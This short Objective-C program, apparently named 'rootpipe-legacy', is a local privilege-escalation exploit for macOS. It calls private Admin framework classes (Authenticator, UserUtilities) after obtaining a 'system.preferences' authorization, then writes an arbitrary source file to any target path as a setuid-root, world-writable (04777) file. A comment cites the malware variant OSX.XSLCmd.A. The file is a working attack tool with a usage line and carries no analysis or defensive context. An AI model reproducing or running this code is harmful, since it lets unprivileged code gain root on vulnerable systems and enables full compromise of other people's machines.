#import <Foundation/Foundation.h>
#import <SecurityFoundation/SFAuthorization.h>


#pragma mark -

@interface UserUtilities : NSObject

+ (BOOL)createFileWithContents:(NSData *)data path:(NSString *)string attributes:(NSDictionary *)attributes;

@end

@interface Authenticator : NSObject

+ (id)sharedAuthenticator;
- (void)authenticateUsingAuthorizationSync:(SFAuthorization *)authorization;
- (BOOL)isAuthenticated;

@end


#pragma mark -

int main(int argc, const char *argv[])
{
	if (argc != 3)
	{
		fprintf(stderr, "Usage: rootpipe-legacy source target\n");
		
		return EXIT_FAILURE;
	}
	
	NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
	
	
	// OSX.XSLCmd.A
	
	Authenticator *authent = [Authenticator sharedAuthenticator];
	
	SFAuthorization *authref = [SFAuthorization authorization];
	
	if ([authref obtainWithRight:"system.preferences" flags:kAuthorizationFlagInteractionAllowed|kAuthorizationFlagExtendRights error:nil])
	{
		[authent authenticateUsingAuthorizationSync:authref];
		
		if ([authent isAuthenticated])
		{
			[UserUtilities createFileWithContents:[NSData dataWithContentsOfFile:@(argv[1])] path:@(argv[2]) attributes:@{ NSFilePosixPermissions: @04777 }];
		}
	}
	
	
	[pool drain];
	
	return EXIT_SUCCESS;
}
